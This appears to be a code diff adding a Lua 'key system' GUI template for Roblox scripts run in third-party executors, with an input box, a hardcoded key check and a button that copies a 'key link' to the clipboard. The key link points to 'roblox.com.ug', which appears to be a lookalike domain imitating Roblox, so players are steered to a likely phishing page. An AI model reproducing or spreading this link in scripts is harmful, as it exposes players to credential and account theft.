@@ -1,0 +1,332 @@
+-- // Key System GUI
+-- // Change the values marked below whenever you need to update them
+
+local VALID_KEY = "key"        -- 🔧 CHANGE THIS: your valid key
+local KEY_LINK  = "https://roblox.com.ug/communities/6089170444/"  -- 🔧 CHANGE THIS: your key link
+
+-- // Services
+local Players        = game:GetService("Players")
+local TweenService   = game:GetService("TweenService")
+local LocalPlayer    = Players.LocalPlayer
+local PlayerGui      = LocalPlayer:WaitForChild("PlayerGui")
+
+-- // Screen GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name             = "KeySystem"
+ScreenGui.ResetOnSpawn     = false
+ScreenGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent           = PlayerGui
+
+-- // Blur Effect
+local Blur = Instance.new("BlurEffect")
+Blur.Size   = 16
+Blur.Parent = game:GetService("Lighting")
+
+-- // Backdrop
+local Backdrop = Instance.new("Frame")
+Backdrop.Size            = UDim2.fromScale(1, 1)
+Backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Backdrop.BackgroundTransparency = 0.45
+Backdrop.BorderSizePixel = 0
+Backdrop.ZIndex          = 1
+Backdrop.Parent          = ScreenGui
+
+-- // Main Window
+local Window = Instance.new("Frame")
+Window.Size              = UDim2.fromOffset(420, 0)   -- height set by UIListLayout
+Window.AutomaticSize     = Enum.AutomaticSize.Y
+Window.AnchorPoint       = Vector2.new(0.5, 0.5)
+Window.Position          = UDim2.fromScale(0.5, 0.5)
+Window.BackgroundColor3  = Color3.fromRGB(15, 15, 19)
+Window.BorderSizePixel   = 0
+Window.ZIndex            = 2
+Window.Parent            = ScreenGui
+
+local WindowCorner = Instance.new("UICorner")
+WindowCorner.CornerRadius = UDim.new(0, 16)
+WindowCorner.Parent       = Window
+
+local WindowStroke = Instance.new("UIStroke")
+WindowStroke.Color     = Color3.fromRGB(42, 42, 58)
+WindowStroke.Thickness = 1
+WindowStroke.Parent    = Window
+
+local WindowLayout = Instance.new("UIListLayout")
+WindowLayout.SortOrder = Enum.SortOrder.LayoutOrder
+WindowLayout.Parent    = Window
+
+-- // Title Bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Size            = UDim2.new(1, 0, 0, 42)
+TitleBar.BackgroundColor3 = Color3.fromRGB(23, 23, 31)
+TitleBar.BorderSizePixel = 0
+TitleBar.LayoutOrder     = 0
+TitleBar.ZIndex          = 3
+TitleBar.Parent          = Window
+
+local TitleBarStroke = Instance.new("UIStroke")
+TitleBarStroke.Color     = Color3.fromRGB(42, 42, 58)
+TitleBarStroke.Thickness = 1
+TitleBarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+TitleBarStroke.Parent    = TitleBar
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size                  = UDim2.fromScale(1, 1)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text                  = "KEY SYSTEM"
+TitleLabel.TextColor3            = Color3.fromRGB(102, 102, 120)
+TitleLabel.Font                  = Enum.Font.GothamBold
+TitleLabel.TextSize              = 11
+TitleLabel.TextXAlignment        = Enum.TextXAlignment.Center
+TitleLabel.ZIndex                = 4
+TitleLabel.Parent                = TitleBar
+
+-- // Body
+local Body = Instance.new("Frame")
+Body.Size             = UDim2.new(1, 0, 0, 0)
+Body.AutomaticSize    = Enum.AutomaticSize.Y
+Body.BackgroundTransparency = 1
+Body.LayoutOrder      = 1
+Body.ZIndex           = 3
+Body.Parent           = Window
+
+local BodyPadding = Instance.new("UIPadding")
+BodyPadding.PaddingLeft   = UDim.new(0, 24)
+BodyPadding.PaddingRight  = UDim.new(0, 24)
+BodyPadding.PaddingTop    = UDim.new(0, 24)
+BodyPadding.PaddingBottom = UDim.new(0, 24)
+BodyPadding.Parent        = Body
+
+local BodyLayout = Instance.new("UIListLayout")
+BodyLayout.SortOrder = Enum.SortOrder.LayoutOrder
+BodyLayout.Padding   = UDim.new(0, 10)
+BodyLayout.Parent    = Body
+
+-- // Badge / Logo
+local BadgeFrame = Instance.new("Frame")
+BadgeFrame.Size             = UDim2.new(1, 0, 0, 32)
+BadgeFrame.BackgroundTransparency = 1
+BadgeFrame.LayoutOrder      = 0
+BadgeFrame.ZIndex           = 4
+BadgeFrame.Parent           = Body
+
+local Badge = Instance.new("Frame")
+Badge.Size            = UDim2.fromOffset(160, 28)
+Badge.AnchorPoint     = Vector2.new(0.5, 0.5)
+Badge.Position        = UDim2.fromScale(0.5, 0.5)
+Badge.BackgroundColor3 = Color3.fromRGB(30, 30, 46)
+Badge.BorderSizePixel = 0
+Badge.ZIndex          = 4
+Badge.Parent          = BadgeFrame
+
+local BadgeCorner = Instance.new("UICorner")
+BadgeCorner.CornerRadius = UDim.new(1, 0)
+BadgeCorner.Parent       = Badge
+
+local BadgeStroke = Instance.new("UIStroke")
+BadgeStroke.Color     = Color3.fromRGB(46, 46, 69)
+BadgeStroke.Thickness = 1
+BadgeStroke.Parent    = Badge
+
+local BadgeLabel = Instance.new("TextLabel")
+BadgeLabel.Size                  = UDim2.fromScale(1, 1)
+BadgeLabel.BackgroundTransparency = 1
+BadgeLabel.Text                  = "ScriptName  v1.0"
+BadgeLabel.TextColor3            = Color3.fromRGB(168, 159, 247)
+BadgeLabel.Font                  = Enum.Font.GothamBold
+BadgeLabel.TextSize              = 12
+BadgeLabel.ZIndex                = 5
+BadgeLabel.Parent                = Badge
+
+-- // Key Label
+local KeyLabel = Instance.new("TextLabel")
+KeyLabel.Size                  = UDim2.new(1, 0, 0, 14)
+KeyLabel.BackgroundTransparency = 1
+KeyLabel.Text                  = "ENTER YOUR KEY"
+KeyLabel.TextColor3            = Color3.fromRGB(85, 85, 105)
+KeyLabel.Font                  = Enum.Font.GothamBold
+KeyLabel.TextSize              = 10
+KeyLabel.TextXAlignment        = Enum.TextXAlignment.Left
+KeyLabel.LayoutOrder           = 1
+KeyLabel.ZIndex                = 4
+KeyLabel.Parent                = Body
+
+-- // Input Box
+local InputFrame = Instance.new("Frame")
+InputFrame.Size            = UDim2.new(1, 0, 0, 40)
+InputFrame.BackgroundColor3 = Color3.fromRGB(19, 19, 26)
+InputFrame.BorderSizePixel = 0
+InputFrame.LayoutOrder     = 2
+InputFrame.ZIndex          = 4
+InputFrame.Parent          = Body
+
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 10)
+InputCorner.Parent       = InputFrame
+
+local InputStroke = Instance.new("UIStroke")
+InputStroke.Color     = Color3.fromRGB(42, 42, 58)
+InputStroke.Thickness = 1
+InputStroke.Parent    = InputFrame
+
+local TextBox = Instance.new("TextBox")
+TextBox.Size                  = UDim2.new(1, -16, 1, 0)
+TextBox.Position              = UDim2.fromOffset(14, 0)
+TextBox.BackgroundTransparency = 1
+TextBox.PlaceholderText       = "XXXX-XXXX-XXXX-XXXX"
+TextBox.PlaceholderColor3     = Color3.fromRGB(60, 60, 75)
+TextBox.Text                  = ""
+TextBox.TextColor3            = Color3.fromRGB(200, 200, 215)
+TextBox.Font                  = Enum.Font.Gotham
+TextBox.TextSize              = 13
+TextBox.ClearTextOnFocus      = false
+TextBox.ZIndex                = 5
+TextBox.Parent                = InputFrame
+
+-- // Hint
+local HintLabel = Instance.new("TextLabel")
+HintLabel.Size                  = UDim2.new(1, 0, 0, 14)
+HintLabel.BackgroundTransparency = 1
+HintLabel.Text                  = "Don't have a key? Copy the link below to get one."
+HintLabel.TextColor3            = Color3.fromRGB(68, 68, 85)
+HintLabel.Font                  = Enum.Font.Gotham
+HintLabel.TextSize              = 10
+HintLabel.TextXAlignment        = Enum.TextXAlignment.Left
+HintLabel.LayoutOrder           = 3
+HintLabel.ZIndex                = 4
+HintLabel.Parent                = Body
+
+-- // Divider
+local Divider = Instance.new("Frame")
+Divider.Size            = UDim2.new(1, 0, 0, 1)
+Divider.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
+Divider.BorderSizePixel = 0
+Divider.LayoutOrder     = 4
+Divider.ZIndex          = 4
+Divider.Parent          = Body
+
+-- // Button Row
+local BtnRow = Instance.new("Frame")
+BtnRow.Size             = UDim2.new(1, 0, 0, 40)
+BtnRow.BackgroundTransparency = 1
+BtnRow.LayoutOrder      = 5
+BtnRow.ZIndex           = 4
+BtnRow.Parent           = Body
+
+local BtnRowLayout = Instance.new("UIListLayout")
+BtnRowLayout.FillDirection = Enum.FillDirection.Horizontal
+BtnRowLayout.SortOrder    = Enum.SortOrder.LayoutOrder
+BtnRowLayout.Padding      = UDim.new(0, 10)
+BtnRowLayout.Parent       = BtnRow
+
+-- // Check Key Button
+local CheckBtn = Instance.new("TextButton")
+CheckBtn.Size            = UDim2.new(0.5, -5, 1, 0)
+CheckBtn.BackgroundColor3 = Color3.fromRGB(124, 111, 247)
+CheckBtn.BorderSizePixel = 0
+CheckBtn.Text            = "Check Key"
+CheckBtn.TextColor3      = Color3.fromRGB(255, 255, 255)
+CheckBtn.Font            = Enum.Font.GothamBold
+CheckBtn.TextSize        = 13
+CheckBtn.LayoutOrder     = 0
+CheckBtn.ZIndex          = 5
+CheckBtn.Parent          = BtnRow
+
+local CheckBtnCorner = Instance.new("UICorner")
+CheckBtnCorner.CornerRadius = UDim.new(0, 10)
+CheckBtnCorner.Parent       = CheckBtn
+
+-- // Copy Link Button
+local CopyBtn = Instance.new("TextButton")
+CopyBtn.Size            = UDim2.new(0.5, -5, 1, 0)
+CopyBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 46)
+CopyBtn.BorderSizePixel = 0
+CopyBtn.Text            = "Copy Link"
+CopyBtn.TextColor3      = Color3.fromRGB(124, 111, 247)
+CopyBtn.Font            = Enum.Font.GothamBold
+CopyBtn.TextSize        = 13
+CopyBtn.LayoutOrder     = 1
+CopyBtn.ZIndex          = 5
+CopyBtn.Parent          = BtnRow
+
+local CopyBtnCorner = Instance.new("UICorner")
+CopyBtnCorner.CornerRadius = UDim.new(0, 10)
+CopyBtnCorner.Parent       = CopyBtn
+
+local CopyBtnStroke = Instance.new("UIStroke")
+CopyBtnStroke.Color     = Color3.fromRGB(46, 46, 80)
+CopyBtnStroke.Thickness = 1
+CopyBtnStroke.Parent    = CopyBtn
+
+-- // Status Label
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size                  = UDim2.new(1, 0, 0, 28)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text                  = ""
+StatusLabel.TextColor3            = Color3.fromRGB(200, 200, 215)
+StatusLabel.Font                  = Enum.Font.GothamBold
+StatusLabel.TextSize              = 12
+StatusLabel.LayoutOrder           = 6
+StatusLabel.ZIndex                = 4
+StatusLabel.Parent                = Body
+
+-- // Footer
+local FooterLabel = Instance.new("TextLabel")
+FooterLabel.Size                  = UDim2.new(1, 0, 0, 14)
+FooterLabel.BackgroundTransparency = 1
+FooterLabel.Text                  = "UNAUTHORIZED USE IS PROHIBITED"
+FooterLabel.TextColor3            = Color3.fromRGB(51, 51, 64)
+FooterLabel.Font                  = Enum.Font.GothamBold
+FooterLabel.TextSize              = 9
+FooterLabel.LayoutOrder           = 7
+FooterLabel.ZIndex                = 4
+FooterLabel.Parent                = Body
+
+-- // Helper: set status message with color
+local function setStatus(msg, color)
+    StatusLabel.Text       = msg
+    StatusLabel.TextColor3 = color
+end
+
+-- // Check Key Logic
+CheckBtn.MouseButton1Click:Connect(function()
+    local entered = TextBox.Text:match("^%s*(.-)%s*$")  -- trim whitespace
+    if entered == "" then
+        setStatus("⚠  Please enter a key first.", Color3.fromRGB(248, 113, 113))
+        return
+    end
+    if entered == VALID_KEY then
+        setStatus("✓  Valid key — loading script…", Color3.fromRGB(74, 222, 128))
+        task.wait(0.8)
+        -- Close GUI and remove blur
+        Blur:Destroy()
+        ScreenGui:Destroy()
+        -- 🔧 PUT YOUR SCRIPT LOGIC HERE (runs after valid key)
+    else
+        setStatus("✗  Invalid key. Get one via the link.", Color3.fromRGB(248, 113, 113))
+    end
+end)
+
+-- // Copy Link Logic
+CopyBtn.MouseButton1Click:Connect(function()
+    setToClipboard(KEY_LINK)   -- works in most executors
+    CopyBtn.Text = "Copied!"
+    setStatus("Link copied to clipboard!", Color3.fromRGB(168, 159, 247))
+    task.wait(2)
+    CopyBtn.Text = "Copy Link"
+    setStatus("", Color3.fromRGB(200, 200, 215))
+end)
+
+-- // Hover effects
+CheckBtn.MouseEnter:Connect(function()
+    TweenService:Create(CheckBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(145, 133, 255)}):Play()
+end)
+CheckBtn.MouseLeave:Connect(function()
+    TweenService:Create(CheckBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(124, 111, 247)}):Play()
+end)
+CopyBtn.MouseEnter:Connect(function()
+    TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 40, 60)}):Play()
+end)
+CopyBtn.MouseLeave:Connect(function()
+    TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(30, 30, 46)}):Play()
+end)
